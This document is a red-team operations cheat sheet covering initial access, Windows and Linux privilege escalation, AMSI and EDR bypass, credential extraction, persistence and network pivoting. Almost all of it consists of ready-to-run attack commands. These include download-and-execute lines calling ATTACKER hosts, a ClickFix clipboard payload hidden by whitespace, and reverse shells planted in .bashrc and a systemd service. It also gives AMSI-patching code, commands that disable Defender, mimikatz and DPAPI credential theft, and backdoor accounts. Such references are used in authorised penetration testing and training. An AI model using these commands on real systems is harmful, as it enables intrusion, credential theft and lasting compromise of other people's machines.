# Red Team Operations

## Initial Access

### Attack Chain Pattern
```
DELIVERY(CONTAINER(TRIGGER + PAYLOAD + DECOY))
- DELIVERY: HTML Smuggling, SVG Smuggling, email attachments
- CONTAINER: ISO/IMG (auto-mounts), ZIP, WIM
- TRIGGER: LNK, CHM, ClickOnce
- PAYLOAD: .exe, .dll (rundll32 main.dll,DllMain), .hta, Office macros
- DECOY: PDF that opens after detonation
```

### ClickFix / FileFix (Social Engineering)

Prompt user to paste clipboard content into Run dialog or File Explorer:
```js
// Set clipboard to long command hidden by whitespace + comment
navigator.clipboard.writeText("powershell.exe -c IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/shell.ps1')                                                    # C:\\company\\internal\\docs\\HR_Policy.docx                                                    ");
```

### HTML Smuggling

Deliver payload via JavaScript Blob — bypasses email attachment scanning:
```html
<script>
const blob = new Blob([atob('AAABBBCCC...')], {type: 'octet/stream'});
const a = document.createElement('a');
a.href = URL.createObjectURL(blob);
a.download = 'invoice.iso';
a.click();
</script>
```

### Windows Download and Execute

```ps1
# PowerShell (CLM bypass: use [Net.WebClient] or bitsadmin for older PS)
IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER/shell.ps1')
powershell -enc BASE64_COMMAND  # bypass execution policy

# BITS
bitsadmin /transfer myJob /download /priority normal http://ATTACKER/evil.exe C:\Temp\evil.exe

# certutil
certutil -urlcache -f http://ATTACKER/evil.exe evil.exe

# mshta
mshta http://ATTACKER/evil.hta

# regsvr32 (squiblydoo)
regsvr32 /s /n /u /i:http://ATTACKER/evil.sct scrobj.dll
```

---

## Windows Privilege Escalation

### Enumeration Tools

```ps1
# Automated
.\Seatbelt.exe -group=all -full
powershell -c "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1'); Invoke-AllChecks"
.\winPEASx64.exe

# Manual checks
whoami /priv /groups
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
wmic service get name,pathname | findstr /i /v "C:\Windows"  # unquoted service paths
icacls "C:\Program Files\*" 2>nul | findstr "(M) (W) Everyone"  # writable program dirs
```

### Common Escalation Paths

**Impersonation Privileges (SeImpersonatePrivilege / SeAssignPrimaryTokenPrivilege):**
```ps1
# Check
whoami /priv | findstr /i "impersonat"

# Potato attacks (service account → SYSTEM)
# JuicyPotato (W2016 and earlier)
JuicyPotato.exe -t * -p cmd.exe -l 10000 -c {4991D34B-80A1-4291-83B6-3328366B9097}

# PrintSpoofer (W2019/10)
PrintSpoofer.exe -i -c cmd.exe

# RoguePotato / EFSPotato / SweetPotato
RoguePotato.exe -r ATTACKER_IP -l 9999 -e "cmd.exe /c net user attacker P@ss /add"
```

**Unquoted Service Paths:**
```ps1
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows" | findstr /i /v """
# If path: C:\Program Files\Vuln App\service.exe
# Place evil binary at: C:\Program Files\Vuln.exe or C:\Program.exe
```

**Writable Service Binary:**
```ps1
icacls "C:\path\to\service.exe"
# Replace binary, then: sc stop VulnSvc && sc start VulnSvc
```

**AlwaysInstallElevated:**
```ps1
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
# If both = 1: msiexec /quiet /qn /i evil.msi
```

**SAM / SYSTEM Extraction:**
```ps1
# HiveNightmare (CVE-2021-36934) - Windows 10 1809+
icacls C:\Windows\System32\config\SAM  # check if readable by non-admin
python3 hivextract.py SAM SYSTEM SECURITY

# Standard
reg.exe save hklm\sam c:\temp\sam.save
reg.exe save hklm\security c:\temp\security.save
reg.exe save hklm\system c:\temp\system.save
secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
```

**Password Hunting:**
```ps1
findstr /si password *.txt *.xml *.config *.ini
dir /s /b /a *.config | findstr /i passw
reg query HKLM /f password /t REG_SZ /s
type C:\Windows\Panther\unattend.xml | findstr /i password
type C:\Windows\System32\sysprep\sysprep.xml | findstr /i password

# PowerShell history
type C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

# Wifi passwords
netsh wlan show profile name="SSID" key=clear
```

**Kernel Exploits:**
```ps1
# MS17-010 (EternalBlue) - Windows 7/2008 R2
python ms17_010_eternalblue.py TARGET_IP ATTACKER_IP/payload.exe
# In Metasploit: use exploit/windows/smb/ms17_010_eternalblue
```

---

## Linux Privilege Escalation

### Enumeration Tools

```bash
# LinPEAS (most comprehensive)
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh && ./linpeas.sh -a

# Others
./LinEnum.sh -s
./lse.sh -l1
```

### Common Escalation Paths

**SUDO:**
```bash
sudo -l  # list allowed commands
# Check GTFOBins: https://gtfobins.github.io/
# Example: sudo vim → :!/bin/bash
# CVE-2019-14287: sudo -u#-1 command (bypass user restriction)
```

**SUID Binaries:**
```bash
find / -perm -u=s -type f 2>/dev/null
# Check each on GTFOBins
```

**Capabilities:**
```bash
getcap -r / 2>/dev/null
# cap_setuid+ep → python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

**Writable /etc/passwd:**
```bash
# Add root user with known hash
echo 'attacker:$(openssl passwd -1 -salt xyz Password1):0:0:root:/root:/bin/bash' >> /etc/passwd
```

**Cron Jobs:**
```bash
crontab -l; cat /etc/crontab; ls -la /etc/cron*
# If script is writable: echo 'chmod +s /bin/bash' >> /path/to/cron_script.sh
```

**Writable Service Script / Path Hijacking:**
```bash
# Check for PATH writable dirs before system dirs
echo $PATH
# Write malicious binary with same name as command used in root cron/service
```

**NFS Root Squashing:**
```bash
cat /etc/exports  # look for no_root_squash
# Mount share, create SUID binary, execute on target
showmount -e TARGET_IP
mount -o rw TARGET_IP:/share /mnt/nfs
cp /bin/bash /mnt/nfs/bash && chmod +s /mnt/nfs/bash
```

**Kernel Exploits:**
```bash
uname -a  # check kernel version
# DirtyPipe (CVE-2022-0847) - Linux 5.8-5.16
# DirtyCow (CVE-2016-5195) - Linux 2.6.22-4.8
```

**Docker Group → Root:**
```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

---

## AMSI / EDR Bypass

### AMSI Bypass (PowerShell)

```ps1
# Patch AmsiScanBuffer (rasta-mouse method)
$a=[Ref].Assembly.GetTypes();foreach($b in $a){if($b.Name -like "*iUtils"){$c=$b}};$d=$c.GetFields('NonPublic,Static');foreach($e in $d){if($e.Name -like "*Context"){$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf=@(0);[System.Runtime.InteropServices.Marshal]::Copy($buf,0,$ptr,1)

# Force error method
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Matt Graeber reflection
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiContext','NonPublic,Static').SetValue($null,$null)

# Use PowerShell v2 (no AMSI)
powershell.exe -version 2 -c "IEX..."

# AMSI.fail (generate obfuscated bypass)
# https://amsi.fail - online generator
```

### EDR Bypass Strategies

```ps1
# Static analysis bypass
# - Obfuscate strings and imports
# - API hashing (custom GetProcAddress)
# - Reduce IAT (Import Address Table)

# Usermode hook bypass
# - Unhooking (overwrite NTDLL hooks with clean copy)
# - Direct/indirect syscalls (call kernel directly)

# Memory scanning bypass
# - Encrypt shellcode in memory, decrypt at runtime
# - Sleep masks / Ekko (encrypt memory while sleeping)

# LOLBAS (Living Off The Land)
# mshta, regsvr32, certutil, bitsadmin, wmic, cmstp, installutil, regasm, regsvcs
```

### Windows Defenses Reference

```ps1
# Check AppLocker
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
Get-ChildItem -Path HKLM:\SOFTWARE\Policies\Microsoft\Windows\SrpV2\Exe
# Bypass: C:\Windows\Tasks (writable), LOLBAS, signed binaries

# Check UAC level
REG QUERY HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA
REG QUERY HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin

# Disable Windows Defender (requires admin)
Set-MpPreference -DisableRealtimeMonitoring $true
Add-MpPreference -ExclusionPath "C:\Temp"

# PowerShell Execution Policy bypass
powershell -ExecutionPolicy Bypass -File script.ps1
powershell -ep bypass -c "..."
```

### DPAPI (Credential Extraction)

```ps1
# List credential files
dir /a:h C:\Users\user\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\user\AppData\Roaming\Microsoft\Credentials\

# Mimikatz DPAPI
mimikatz dpapi::cred /in:C:\Users\user\AppData\Local\Microsoft\Credentials\FILE_GUID
mimikatz !sekurlsa::dpapi  # get master keys from memory

# DonPAPI (dump all DPAPI remotely - requires admin)
python3 DonPAPI.py domain/user:pass@TARGET
python3 DonPAPI.py domain/user:pass@TARGET -pvk DOMAIN_BACKUP_KEY.pvk

# Hekatomb (steal all domain credentials via DPAPI)
python3 hekatomb.py domain.local/admin:pass@DC_IP
```

---

## Persistence

### Windows Persistence

```ps1
# Registry Run Keys (user-level)
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Update /t REG_SZ /d "C:\Temp\evil.exe"
reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v Update /t REG_SZ /d "C:\Temp\evil.exe"  # admin

# Startup folder
copy evil.exe "C:\Users\user\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\"
copy evil.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\"  # all users

# Scheduled tasks
schtasks /create /tn "Update" /tr "C:\Temp\evil.exe" /sc onlogon /ru SYSTEM
schtasks /create /tn "Update" /tr "powershell -enc BASE64" /sc minute /mo 5

# Service
sc create MySvc binPath= "C:\Temp\evil.exe" start= auto
sc start MySvc

# Winlogon Helper DLL (admin)
reg add HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon /v Userinit /d "C:\Windows\system32\userinit.exe, C:\Temp\evil.exe" /f

# WMI event subscription (stealthy, SYSTEM-level)
# Use SharPersist or Empire WMI module

# Skeleton Key (DC - requires mimikatz, survives reboots is NOT a real persistence)
mimikatz> privilege::debug
mimikatz> misc::skeleton  # password for all accounts becomes "mimikatz"

# Golden Certificate (ADCS - persists even after password changes)
certipy ca -backup -u admin@domain.local -p pass -dc-ip DC_IP -ca 'DOMAIN-CA'
certipy forge -ca-pfx 'DOMAIN-CA.pfx' -upn administrator@domain.local

# Golden Ticket (krbtgt hash - 10 year validity)
mimikatz> kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-... /krbtgt:HASH /ptt
```

### Linux Persistence

```bash
# Add root user
echo 'attacker:HASH:0:0:root:/root:/bin/bash' >> /etc/passwd
useradd -ou 0 -g 0 attacker && passwd attacker

# SUID binary
cp /bin/bash /tmp/.hidden && chmod +s /tmp/.hidden
# Execute: /tmp/.hidden -p

# Crontab
(crontab -l 2>/dev/null; echo "*/5 * * * * /tmp/.shell") | crontab -
echo "* * * * * root /tmp/.shell" >> /etc/crontab

# Bashrc backdoor
echo 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' >> ~/.bashrc

# SSH authorized_keys
echo "ssh-rsa ATTACKER_KEY" >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys

# Systemd service
cat > /etc/systemd/system/backdoor.service << EOF
[Service]
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'
Restart=always
[Install]
WantedBy=multi-user.target
EOF
systemctl enable backdoor.service
```

### RDP Persistence

```ps1
# Enable RDP
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
netsh advfirewall firewall add rule name="RDP" dir=in action=allow protocol=TCP localport=3389

# Sticky Keys backdoor (requires SYSTEM file write)
# Replace C:\Windows\System32\sethc.exe with cmd.exe
copy /y cmd.exe sethc.exe  # then press Shift 5x at lock screen

# Enable RDP with PTH (Restricted Admin Mode)
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f
# Then: mstsc /restrictedadmin /v:TARGET_IP
```

---

## Network Pivoting

### Tools Comparison

| Tool | Method | Notes |
|------|--------|-------|
| `ligolo-ng` | TUN interface | Full routing, transparent pivoting |
| `chisel` | HTTP/SOCKS5 | Simple setup, client/server |
| `wstunnel` | WebSocket/HTTP2 | Firewall bypass |
| `ssh` | SOCKS4/5 | Built-in, OPSEC |
| `reGeorg` | SOCKS via webshell | Web server pivot |
| `rpivot` | Reverse SOCKS | Behind NAT |

### Chisel (Most Common)

```bash
# Attacker (server)
chisel server -p 8008 --reverse

# Target (client)
chisel.exe client ATTACKER_IP:8008 R:socks  # reverse SOCKS5 on attacker:1080
chisel.exe client ATTACKER_IP:8008 R:3306:INTERNAL_IP:3306  # port forward

# Use with proxychains
echo "socks5 127.0.0.1 1080" >> /etc/proxychains.conf
proxychains nmap -sT -p 80,443,8080 INTERNAL_RANGE
```

### Ligolo-ng (Full Network Routing)

```bash
# Attacker
ip tuntap add user $USER mode tun ligolo
ip link set ligolo up
./proxy -selfcert  # start ligolo proxy

# Target
./agent.exe -connect ATTACKER_IP:11601 -ignore-cert

# In ligolo console: session → start → add route
ip route add INTERNAL_SUBNET/24 dev ligolo  # transparent pivoting
```

### SSH Tunneling

```bash
# Dynamic SOCKS proxy
ssh -N -f -D 1080 user@JUMP_HOST

# Local port forward: local:8080 → internal:80
ssh -L 8080:INTERNAL_IP:80 user@JUMP_HOST

# Remote port forward: attacker:4444 → target listens
ssh -R 4444:localhost:4444 user@ATTACKER

# Double pivot
ssh -J user@JUMP1 user@JUMP2  # ProxyJump
```

### socat

```bash
# Port relay
socat TCP-LISTEN:4444,fork TCP:INTERNAL_IP:4444

# Reverse shell relay
socat TCP-LISTEN:80,fork TCP:ATTACKER:8080
```
